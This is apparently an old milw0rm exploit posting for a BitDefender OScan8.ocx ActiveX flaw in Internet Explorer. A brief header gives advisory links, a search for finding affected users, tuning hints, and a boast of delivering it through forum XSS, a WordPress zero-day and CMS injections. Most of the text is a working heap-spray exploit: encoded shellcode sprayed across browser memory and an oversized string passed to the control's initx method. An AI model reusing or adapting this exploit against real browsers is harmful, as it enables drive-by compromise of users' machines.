=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
    BitDefender OScan8.ocx / Oscan81.ocx ActiveX Exploit
 
=-=-=-=-=-=-=-=-=-=-=-=-PRIVATE! NOT PUBLIC!=-=-=-=-=-=-=-=-=-=-=-=-
 
http://research.eeye.com/html/advisories/published/AD20071120.html
http://secunia.com/advisories/27717/
 
 
This works not 100% - it corrupts random memory in the browser and Launches calculator with success.
 
Users have had this installed since 2006!  With no autoupdates :)
 
Google Search of BD OSCAN =  
http://www.google.com/search?hl=ar&safe=off&rls=fr&hs=P4T&q=%225D86DDB5-BDF9-441B-9E9E-D4730F4EE499%22&btnG=Search
 
Modify the values in these to help keep it stable:
'SiteAuthority' - different memory address ?? - it turns values to literal address !
while (SiteAuthority.length < 60000) - Maybe larger/smaller?
 
 
Crashes IE even if it fails
 
Tested with Forum XSS Injections + Wordpress 0day + CMS Injections
 
Nphinity  
#SAMAH/#SYR/#SHAHADA
mesra.kl.my.dal.net
 
 
 
 
=-=-=-=-=-=-=-=-=-=-=-=-PRIVATE! NOT PUBLIC!=-=-=-=-=-=-=-=-=-=-=-=-
 
 
 
 
<html>
 
 
<object classid='clsid:5D86DDB5-BDF9-441B-9E9E-D4730F4EE499' id='BD'>
</object>
 
<script language="javascript">
 
 
SCPL = unescape("%u9090%u9090%u9090%uC929%uE983%uD9DB%uD9EE%u2474" +
"%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55" +
"%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6" +
"%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69" +
"%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D" +
"%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8" +
"%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9" +
"%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40" +
"%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6" +
"%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7" +  
"%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC" +
"%uCC4A%uD0FF");
 
MemContent = unescape("%u0606");
 
HSize = 20;
 
FreeSpace = HSize+SCPL.length
 
while (MemContent.length<FreeSpace)  
{
    MemContent+=MemContent;
}
 
FB = MemContent.substring(0, FreeSpace);
 
Mem = MemContent.substring(0, MemContent.length-FreeSpace);
 
while(Mem.length+FreeSpace<0x60000)  
{
    Mem = Mem+Mem+FB;
}
 
memory = new Array();
 
for (x=0;x<600;x++) memory[x] = Mem + SCPL;
 
var SiteAuthority = '%%';
 
while (SiteAuthority.length < 60000)  
{
    SiteAuthority+='\x30\x36\x30\x36';
}
 
BD.initx(SiteAuthority);
 
</script>
</html>

# milw0rm.com [2007-11-27]
